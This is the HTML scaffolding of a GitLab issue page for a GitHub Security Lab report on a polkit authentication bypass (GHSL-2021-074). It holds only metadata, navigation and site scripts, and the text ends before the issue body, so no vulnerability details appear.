



<!DOCTYPE html>
<html class="gl-light ui-neutral with-top-bar with-header " lang="en">
<head prefix="og: http://ogp.me/ns#">
<meta charset="utf-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1" name="viewport">
<title>GHSL-2021-074: authentication bypass vulnerability in polkit (#140) · Issues · polkit / polkit · GitLab</title>
<script>
//<![CDATA[
window.gon={};gon.api_version="v4";gon.default_avatar_url="https://gitlab.freedesktop.org/assets/no_avatar-849f9c04a3a0d0cea2424ae97b27447dc64a7dbfae83c036c45b403392f0e8ba.png";gon.max_file_size=1000;gon.asset_host=null;gon.webpack_public_path="/assets/webpack/";gon.relative_url_root="";gon.user_color_mode="gl-light";gon.user_color_scheme="white";gon.markdown_surround_selection=null;gon.markdown_automatic_lists=null;gon.math_rendering_limits_enabled=true;gon.recaptcha_api_server_url="https://www.recaptcha.net/recaptcha/api.js";gon.recaptcha_sitekey="6LdPDj8UAAAAAI6bxUG8Y_dvuBtTxGncp65SqzOk";gon.gitlab_url="https://gitlab.freedesktop.org";gon.promo_url="https://about.gitlab.com";gon.forum_url="https://forum.gitlab.com";gon.docs_url="https://docs.gitlab.com";gon.revision="58dfc9c873e";gon.feature_category="team_planning";gon.gitlab_logo="/assets/gitlab_logo-2957169c8ef64c58616a1ac3f4fc626e8a35ce4eb3ed31bb0d873712f2a041a0.png";gon.secure=true;gon.sprite_icons="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg";gon.sprite_file_icons="/assets/file_icons/file_icons-7cd3d6c3b29a6d972895f36472978a4b5adb4b37f9b5d0716a380e82389f7e0e.svg";gon.emoji_sprites_css_path="/assets/emoji_sprites-d746ae2450a3e9c626d338d77a101b84ff33a47c0c281b676d75c4a6ed2948a4.css";gon.emoji_backend_version=4;gon.gridstack_css_path="/assets/lazy_bundles/gridstack-5fcfd4ffbea1db04eaf7f16521bcab19ae3af042c8b4afe8d16781eda5a70799.css";gon.test_env=false;gon.disable_animations=null;gon.suggested_label_colors={"#cc338b":"Magenta-pink","#dc143c":"Crimson","#c21e56":"Rose red","#cd5b45":"Dark coral","#ed9121":"Carrot orange","#eee600":"Titanium yellow","#009966":"Green-cyan","#8fbc8f":"Dark sea green","#6699cc":"Blue-gray","#e6e6fa":"Lavender","#9400d3":"Dark violet","#330066":"Deep violet","#36454f":"Charcoal grey","#808080":"Gray"};gon.first_day_of_week=1;gon.time_display_relative=true;gon.time_display_format=0;gon.ee=false;gon.jh=false;gon.dot_com=false;gon.uf_error_prefix="UF";gon.pat_prefix="glpat-";gon.keyboard_shortcuts_enabled=true;gon.diagramsnet_url="https://embed.diagrams.net";gon.features={"sourceEditorToolbar":false,"vscodeWebIde":true,"uiForOrganizations":false,"organizationSwitching":false,"findAndReplace":false,"removeMonitorMetrics":true,"workItemsViewPreference":false,"searchButtonTopRight":false,"asyncSidebarCounts":false,"preserveMarkdown":false,"issuesGridView":false,"serviceDeskTicket":false,"issuesListDrawer":false,"notificationsTodosButtons":false,"glqlIntegration":false,"workItems":true,"workItemsBeta":false,"workItemsAlpha":false,"epicWidgetEditConfirmation":false,"namespaceLevelWorkItems":false};
//]]>
</script>


<script>
//<![CDATA[
var gl = window.gl || {};
gl.startup_calls = {"/polkit/polkit/-/issues/140/related_branches":{},"/polkit/polkit/-/issues/140/discussions.json?per_page=20":{},"/polkit/polkit/-/issues/140.json?serializer=sidebar_extras":{}};
gl.startup_graphql_calls = null;

if (gl.startup_calls && window.fetch) {
  Object.keys(gl.startup_calls).forEach(apiCall => {
   gl.startup_calls[apiCall] = {
      fetchCall: fetch(apiCall, {
        // Emulate XHR for Rails AJAX request checks
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        },
        // fetch won’t send cookies in older browsers, unless you set the credentials init option.
        // We set to `same-origin` which is default value in modern browsers.
        // See https://github.com/whatwg/fetch/pull/585 for more information.
        credentials: 'same-origin'
      })
    };
  });
}
if (gl.startup_graphql_calls && window.fetch) {
  const headers = {"X-CSRF-Token":"E6t3ylZl-CNJ72EmpYAnCHFEPfiAvru37DAWPFWbfrdJzczxxKvqOCO-0yGFkRKuoHjzuwtZIbUmWsnb8h4FEA","x-gitlab-feature-category":"team_planning"};
  const url = `https://gitlab.freedesktop.org/api/graphql`

  const opts = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...headers,
    }
  };

  gl.startup_graphql_calls = gl.startup_graphql_calls.map(call => ({
    ...call,
    fetchCall: fetch(url, {
      ...opts,
      credentials: 'same-origin',
      body: JSON.stringify(call)
    })
  }))
}


//]]>
</script>



<link rel="stylesheet" href="/assets/application-2e69a08e74e113997b5ba7fc5cd3e020a6f407d9ad552675adc6d78c2b23d0f7.css" />
<link rel="stylesheet" href="/assets/page_bundles/design_management-55b7f0d1f8549b24ba19c0b5aaf18a17a8d3828677fad074d37dd2e69d08da2b.css" /><link rel="stylesheet" href="/assets/page_bundles/incidents-6598dbf61fe32a8ddb1b06150f2301451ad41554975581e771efc5f890d0443f.css" /><link rel="stylesheet" href="/assets/page_bundles/issuable-01914381150850b46ac12e613a08df1d9b815aa305882ef8482ccd64eda0773f.css" /><link rel="stylesheet" href="/assets/page_bundles/notes_shared-caf98f77b75b4b5399bdde69c069ee023fefdaa986d687c937e8010218785f51.css" /><link rel="stylesheet" href="/assets/page_bundles/issues_show-785541c300108b8ecf7c08fd02bd67f4d6b9d59c86918ecfbf91bae5e1c8ffa8.css" /><link rel="stylesheet" href="/assets/page_bundles/work_items-cbc6a2e1633c4e847a617e35cc4833b85b80816db688d3d6dd3cd31d4251bc53.css" /><link rel="stylesheet" href="/assets/page_bundles/labels-3508460b8d6f839e9d60de1f2065fdaf7f057efab04cf71966acef6a86fe9b41.css" /><link rel="stylesheet" href="/assets/page_bundles/commit_description-1e2cba4dda3c7b30dd84924809020c569f1308dea51520fe1dd5d4ce31403195.css" />
<link rel="stylesheet" href="/assets/application_utilities-0bfb919a8a7eb0e89544dfe328e69461ccb276a565685fdb6ae3b14f3db3f41b.css" />
<link rel="stylesheet" href="/assets/tailwind-016e83140c37d97dbdff0cef9c063fcd43d214866665fb783774776747928853.css" />


<link rel="stylesheet" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" />
<link rel="stylesheet" href="/assets/highlight/themes/white-5ffbb706faebead681b01c8b52e92c6c0d35ad5b1c11d39012c90bcaf7892ca8.css" />


<link rel="preload" href="/assets/application_utilities-0bfb919a8a7eb0e89544dfe328e69461ccb276a565685fdb6ae3b14f3db3f41b.css" as="style" type="text/css">
<link rel="preload" href="/assets/application-2e69a08e74e113997b5ba7fc5cd3e020a6f407d9ad552675adc6d78c2b23d0f7.css" as="style" type="text/css">
<link rel="preload" href="/assets/highlight/themes/white-5ffbb706faebead681b01c8b52e92c6c0d35ad5b1c11d39012c90bcaf7892ca8.css" as="style" type="text/css">




<script src="/assets/webpack/runtime.10b44924.bundle.js" defer="defer"></script>
<script src="/assets/webpack/main.a4c9ae4f.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.admin.topics.edit-pages.admin.topics.new-pages.dashboar-c8f1318b.54872cef.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.dashboard.issues-pages.dashboard.milestones.show-pages.-13e11bbf.1a73330b.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.dashboard.issues-pages.groups.boards-pages.groups.issue-8dfa5f96.20262e8b.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.dashboard.issues-pages.groups.boards-pages.groups.issue-f804d6c2.d4f467df.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.new-pages.import.gitlab_projects.new-pages.import.manifest.new-pages.projects.n-44c6c18e.800b02b5.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.search.show-super_sidebar.98a5daf8.chunk.js" defer="defer"></script>
<script src="/assets/webpack/super_sidebar.839aed14.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.projects-pages.projects.activity-pages.projects.alert_management.details-pages.project-2cf3f004.cf930f47.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.admin.topics.edit-pages.admin.topics.new-pages.groups.m-b59cd8e6.af19401d.chunk.js" defer="defer"></script>
<script src="/assets/webpack/5.7a5f7362.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.admin.topics.edit-pages.admin.topics.new-pages.groups.m-bfc75f5d.bc5ed18e.chunk.js" defer="defer"></script>
<script src="/assets/webpack/9.bc4d8be7.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.admin.topics.edit-pages.admin.topics.new-pages.groups.m-74b1dcb9.25b64210.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports-pages.admin.abuse_reports.show-pages.admin.groups.index-pages.admi-e271b53c.4fcbe683.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.topics.edit-pages.admin.topics.new-pages.groups.milestones.edit-pages.groups.mil-2f72a3d7.5269b7ea.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.dashboard.milestones.show-pages.groups.merge_requests-p-6152ef8e.1d43fc45.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.dashboard.milestones.show-pages.groups.merge_requests-pages.groups.milestones.edit-pag-8e438287.4a86321e.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.dashboard.issues-pages.groups.issues-pages.groups.merge_requests-pages.groups.work_ite-dc744cb1.d70eece9.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.issues-pages.groups.merge_requests-pages.groups.work_items-pages.groups.work_it-ed595783.87e56f63.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.milestones.edit-pages.groups.milestones.new-pages.groups.milestones.show-pages.-7486cfee.c1a8fe55.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.merge_requests-pages.groups.work_items-pages.groups.work_items.show-pages.proje-a6a6c699.b1ed2339.chunk.js" defer="defer"></script>
<script src="/assets/webpack/pages.projects.issues.show.fe9c774a.chunk.js" defer="defer"></script>

<meta content="object" property="og:type">
<meta content="GitLab" property="og:site_name">
<meta content="GHSL-2021-074: authentication bypass vulnerability in polkit (#140) · Issues · polkit / polkit · GitLab" property="og:title">
<meta content=" GitHub Security Lab (GHSL) Vulnerability Report: GHSL-2021-074  The GitHub Security Lab team has..." property="og:description">
<meta content="https://gitlab.freedesktop.org/assets/twitter_card-570ddb06edf56a2312253c5872489847a0f385112ddbcd71ccfa1570febab5d2.jpg" property="og:image">
<meta content="64" property="og:image:width">
<meta content="64" property="og:image:height">
<meta content="https://gitlab.freedesktop.org/polkit/polkit/-/issues/140" property="og:url">
<meta content="summary" property="twitter:card">
<meta content="GHSL-2021-074: authentication bypass vulnerability in polkit (#140) · Issues · polkit / polkit · GitLab" property="twitter:title">
<meta content=" GitHub Security Lab (GHSL) Vulnerability Report: GHSL-2021-074  The GitHub Security Lab team has..." property="twitter:description">
<meta content="https://gitlab.freedesktop.org/assets/twitter_card-570ddb06edf56a2312253c5872489847a0f385112ddbcd71ccfa1570febab5d2.jpg" property="twitter:image">
<meta property="twitter:label1" content="Author"><meta property="twitter:data1" content="Kevin Backhouse">
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="sWApDps4sP_yL1adKDem3fdI1Tl4Akuwd1xZWyLTmhLrBpI1Cfai5Jh-5JoIJpN7JnQbevPl0bK9Noa8hVbhtQ" />
<meta name="csp-nonce" />
<meta name="action-cable-url" content="/-/cable" />
<link href="/-/manifest.json" rel="manifest">
<link rel="icon" type="image/png" href="/uploads/-/system/appearance/favicon/1/fdo-favicon.ico" id="favicon" data-original-href="/uploads/-/system/appearance/favicon/1/fdo-favicon.ico" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/apple-touch-icon-b049d4bc0dd9626f31db825d61880737befc7835982586d015bded10b4435460.png" />
<link href="/search/opensearch.xml" rel="search" title="Search GitLab" type="application/opensearchdescription+xml">




<meta content=" GitHub Security Lab (GHSL) Vulnerability Report: GHSL-2021-074  The GitHub Security Lab team has..." name="description">
<meta content="#ececef" name="theme-color">
</head>

<body class="tab-width-8 gl-browser-chrome gl-platform-windows" data-find-file="/polkit/polkit/-/find_file/master" data-group="polkit" data-group-full-path="polkit" data-namespace-id="1230" data-page="projects:issues:show" data-page-type-id="140" data-project="polkit" data-project-full-path="polkit/polkit" data-project-id="884">
<script>
//<![CDATA[
gl = window.gl || {};
gl.GfmAutoComplete = gl.GfmAutoComplete || {};
gl.GfmAutoComplete.dataSources = {"members":"/polkit/polkit/-/autocomplete_sources/members?type=Issue\u0026type_id=140","issues":"/polkit/polkit/-/autocomplete_sources/issues","mergeRequests":"/polkit/polkit/-/autocomplete_sources/merge_requests","labels":"/polkit/polkit/-/autocomplete_sources/labels?type=Issue\u0026type_id=140","milestones":"/polkit/polkit/-/autocomplete_sources/milestones","commands":"/polkit/polkit/-/autocomplete_sources/commands?type=Issue\u0026type_id=140","snippets":"/polkit/polkit/-/autocomplete_sources/snippets","contacts":"/polkit/polkit/-/autocomplete_sources/contacts?type=Issue\u0026type_id=140","wikis":null};


//]]>
</script>
<script>
//<![CDATA[
gl = window.gl || {};
gl.client = {"isChrome":true,"isWindows":true};


//]]>
</script>


<header class="header-logged-out" data-testid="navbar">
<a class="gl-sr-only gl-accessibility" href="#content-body">Skip to content</a>
<div class="container-fluid">
<nav aria-label="Explore GitLab" class="header-logged-out-nav gl-flex gl-gap-3 gl-justify-between">
<div class="gl-flex gl-items-center gl-gap-1">
<span class="gl-sr-only">GitLab</span>
<a title="Homepage" id="logo" class="header-logged-out-logo has-tooltip" aria-label="Homepage" href="/"><img class="brand-header-logo lazy" alt="" data-src="/uploads/-/system/appearance/header_logo/1/fdo-logo-header.png" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" />
</a></div>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-grow">
<li class="header-logged-out-nav-item">
<a class="" href="/explore">Explore</a>
</li>
</ul>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-justify-end">
<li class="header-logged-out-nav-item">
<a href="/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
<li class="header-logged-out-nav-item">
<a class="gl-button btn btn-md btn-confirm " href="/users/sign_up"><span class="gl-button-text">
Register

</span>

</a></li>
</ul>
</nav>
</div>
</header>

<div class="layout-page page-gutter right-sidebar-expanded page-with-super-sidebar">
<aside class="js-super-sidebar super-sidebar super-sidebar-loading" data-command-palette="{&quot;project_files_url&quot;:&quot;/polkit/polkit/-/files/master?format=json&quot;,&quot;project_blob_url&quot;:&quot;/polkit/polkit/-/blob/master&quot;}" data-force-desktop-expanded-sidebar="" data-is-saas="false" data-root-path="/" data-sidebar="{&quot;is_logged_in&quot;:false,&quot;context_switcher_links&quot;:[{&quot;title&quot;:&quot;Explore&quot;,&quot;link&quot;:&quot;/explore&quot;,&quot;icon&quot;:&quot;compass&quot;}],&quot;current_menu_items&quot;:[{&quot;id&quot;:&quot;project_overview&quot;,&quot;title&quot;:&quot;polkit&quot;,&quot;entity_id&quot;:884,&quot;link&quot;:&quot;/polkit/polkit&quot;,&quot;link_classes&quot;:&quot;shortcuts-project&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;manage_menu&quot;,&quot;title&quot;:&quot;Manage&quot;,&quot;icon&quot;:&quot;users&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/polkit/polkit/activity&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;activity&quot;,&quot;title&quot;:&quot;Activity&quot;,&quot;link&quot;:&quot;/polkit/polkit/activity&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-activity&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;members&quot;,&quot;title&quot;:&quot;Members&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/project_members&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;labels&quot;,&quot;title&quot;:&quot;Labels&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/labels&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;plan_menu&quot;,&quot;title&quot;:&quot;Plan&quot;,&quot;icon&quot;:&quot;planning&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/issues&quot;,&quot;is_active&quot;:true,&quot;items&quot;:[{&quot;id&quot;:&quot;project_issue_list&quot;,&quot;title&quot;:&quot;Issues&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/issues&quot;,&quot;pill_count&quot;:&quot;119&quot;,&quot;link_classes&quot;:&quot;shortcuts-issues has-sub-items&quot;,&quot;is_active&quot;:true},{&quot;id&quot;:&quot;boards&quot;,&quot;title&quot;:&quot;Issue boards&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/boards&quot;,&quot;link_classes&quot;:&quot;shortcuts-issue-boards&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;milestones&quot;,&quot;title&quot;:&quot;Milestones&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/milestones&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;code_menu&quot;,&quot;title&quot;:&quot;Code&quot;,&quot;icon&quot;:&quot;code&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/merge_requests&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;project_merge_request_list&quot;,&quot;title&quot;:&quot;Merge requests&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/merge_requests&quot;,&quot;pill_count&quot;:&quot;0&quot;,&quot;link_classes&quot;:&quot;shortcuts-merge_requests&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;files&quot;,&quot;title&quot;:&quot;Repository&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/tree/master&quot;,&quot;link_classes&quot;:&quot;shortcuts-tree&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;branches&quot;,&quot;title&quot;:&quot;Branches&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/branches&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;commits&quot;,&quot;title&quot;:&quot;Commits&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/commits/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-commits&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;tags&quot;,&quot;title&quot;:&quot;Tags&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/tags&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;graphs&quot;,&quot;title&quot;:&quot;Repository graph&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/network/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-network&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;compare&quot;,&quot;title&quot;:&quot;Compare revisions&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/compare?from=master\u0026to=master&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;project_snippets&quot;,&quot;title&quot;:&quot;Snippets&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/snippets&quot;,&quot;link_classes&quot;:&quot;shortcuts-snippets&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;build_menu&quot;,&quot;title&quot;:&quot;Build&quot;,&quot;icon&quot;:&quot;rocket&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/pipelines&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;pipelines&quot;,&quot;title&quot;:&quot;Pipelines&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/pipelines&quot;,&quot;link_classes&quot;:&quot;shortcuts-pipelines&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;jobs&quot;,&quot;title&quot;:&quot;Jobs&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/jobs&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;pipeline_schedules&quot;,&quot;title&quot;:&quot;Pipeline schedules&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/pipeline_schedules&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;artifacts&quot;,&quot;title&quot;:&quot;Artifacts&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/artifacts&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;deploy_menu&quot;,&quot;title&quot;:&quot;Deploy&quot;,&quot;icon&quot;:&quot;deployments&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/releases&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;releases&quot;,&quot;title&quot;:&quot;Releases&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/releases&quot;,&quot;link_classes&quot;:&quot;shortcuts-deployments-releases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;container_registry&quot;,&quot;title&quot;:&quot;Container Registry&quot;,&quot;link&quot;:&quot;/polkit/polkit/container_registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_registry&quot;,&quot;title&quot;:&quot;Model registry&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/ml/models&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;operations_menu&quot;,&quot;title&quot;:&quot;Operate&quot;,&quot;icon&quot;:&quot;cloud-pod&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/environments&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;environments&quot;,&quot;title&quot;:&quot;Environments&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/environments&quot;,&quot;link_classes&quot;:&quot;shortcuts-environments&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;monitor_menu&quot;,&quot;title&quot;:&quot;Monitor&quot;,&quot;icon&quot;:&quot;monitor&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/incidents&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;incidents&quot;,&quot;title&quot;:&quot;Incidents&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/incidents&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;analyze_menu&quot;,&quot;title&quot;:&quot;Analyze&quot;,&quot;icon&quot;:&quot;chart&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/value_stream_analytics&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;cycle_analytics&quot;,&quot;title&quot;:&quot;Value stream analytics&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/value_stream_analytics&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-cycle-analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;contributors&quot;,&quot;title&quot;:&quot;Contributor analytics&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/graphs/master?ref_type=heads&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;ci_cd_analytics&quot;,&quot;title&quot;:&quot;CI/CD analytics&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/pipelines/charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;repository_analytics&quot;,&quot;title&quot;:&quot;Repository analytics&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/graphs/master/charts&quot;,&quot;link_classes&quot;:&quot;shortcuts-repository-charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_experiments&quot;,&quot;title&quot;:&quot;Model experiments&quot;,&quot;link&quot;:&quot;/polkit/polkit/-/ml/experiments&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false}],&quot;current_context_header&quot;:&quot;Project&quot;,&quot;support_path&quot;:&quot;https://about.gitlab.com/get-help/&quot;,&quot;docs_path&quot;:&quot;/help/docs&quot;,&quot;display_whats_new&quot;:false,&quot;show_version_check&quot;:null,&quot;search&quot;:{&quot;search_path&quot;:&quot;/search&quot;,&quot;issues_path&quot;:&quot;/dashboard/issues&quot;,&quot;mr_path&quot;:&quot;/dashboard/merge_requests&quot;,&quot;autocomplete_path&quot;:&quot;/search/autocomplete&quot;,&quot;settings_path&quot;:&quot;/search/settings&quot;,&quot;search_context&quot;:{&quot;group&quot;:{&quot;id&quot;:1230,&quot;name&quot;:&quot;polkit&quot;,&quot;full_name&quot;:&quot;polkit&quot;},&quot;group_metadata&quot;:{&quot;issues_path&quot;:&quot;/groups/polkit/-/issues&quot;,&quot;mr_path&quot;:&quot;/groups/polkit/-/merge_requests&quot;},&quot;project&quot;:{&quot;id&quot;:884,&quot;name&quot;:&quot;polkit&quot;},&quot;project_metadata&quot;:{&quot;mr_path&quot;:&quot;/polkit/polkit/-/merge_requests&quot;,&quot;issues_path&quot;:&quot;/polkit/polkit/-/issues&quot;},&quot;code_search&quot;:false,&quot;scope&quot;:&quot;issues&quot;,&quot;for_snippets&quot;:null}},&quot;panel_type&quot;:&quot;project&quot;,&quot;shortcut_links&quot;:[{&quot;title&quot;:&quot;Snippets&quot;,&quot;href&quot;:&quot;/explore/snippets&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-snippets&quot;},{&quot;title&quot;:&quot;Groups&quot;,&quot;href&quot;:&quot;/explore/groups&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-groups&quot;},{&quot;title&quot;:&quot;Projects&quot;,&quot;href&quot;:&quot;/explore/projects/starred&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-projects&quot;}],&quot;terms&quot;:&quot;/-/users/terms&quot;}"></aside>

<div class="content-wrapper">
<div class="broadcast-wrapper">

<div class="gl-broadcast-message banner js-broadcast-notification-10 light-red" data-broadcast-banner data-testid="banner-broadcast-message" role="alert">
<div class="gl-broadcast-message-content">
<div class="gl-broadcast-message-icon">
<svg class="s16" data-testid="bullhorn-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#bullhorn"></use></svg>
</div>
<div class="gl-broadcast-message-text">
<h2 class="gl-sr-only">Admin message</h2>
<p>Due to an influx of spam, we have had to impose restrictions on new accounts. Please see <a href="https://gitlab.freedesktop.org/freedesktop/freedesktop/-/wikis/home">this wiki page</a> for instructions on how to get full permissions. Sorry for the inconvenience.</p>
</div>
</div>
<button class="gl-button btn btn-icon btn-sm btn-default btn-default-tertiary gl-broadcast-message-dismiss js-dismiss-current-broadcast-notification" aria-label="Close" data-id="10" data-expire-date="2030-12-01T21:21:05Z" data-cookie-key="hide_broadcast_message_10" type="button"><svg class="s16 gl-icon gl-button-icon " data-testid="close-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#close"></use></svg>

</button>
</div>





</div>
<div class="alert-wrapper alert-wrapper-top-space gl-flex gl-flex-col gl-gap-3 container-fluid container-limited">







<div class="gl-alert gl-alert-info gl-alert-not-dismissible" role="alert">
<div class="gl-alert-icon-container">
<svg class="s16 gl-alert-icon gl-alert-icon-no-title" data-testid="information-o-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#information-o"></use></svg>
</div>
<div class="gl-alert-content" role="alert">
<div class="gl-alert-body">
This is an archived project. Repository and other project resources are read-only.

</div>
</div>
</div>


















</div>
<div class="top-bar-fixed container-fluid" data-testid="top-bar">
<div class="top-bar-container gl-flex gl-items-center gl-gap-2">
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-start">
<button class="gl-button btn btn-icon btn-md btn-default btn-default-tertiary js-super-sidebar-toggle-expand super-sidebar-toggle -gl-ml-3" aria-controls="super-sidebar" aria-expanded="false" aria-label="Primary navigation sidebar" type="button"><svg class="s16 gl-icon gl-button-icon " data-testid="sidebar-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#sidebar"></use></svg>

</button>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"polkit","item":"https://gitlab.freedesktop.org/polkit"},{"@type":"ListItem","position":2,"name":"polkit","item":"https://gitlab.freedesktop.org/polkit/polkit"},{"@type":"ListItem","position":3,"name":"Issues","item":"https://gitlab.freedesktop.org/polkit/polkit/-/issues"},{"@type":"ListItem","position":4,"name":"#140","item":"https://gitlab.freedesktop.org/polkit/polkit/-/issues/140"}]}


</script>
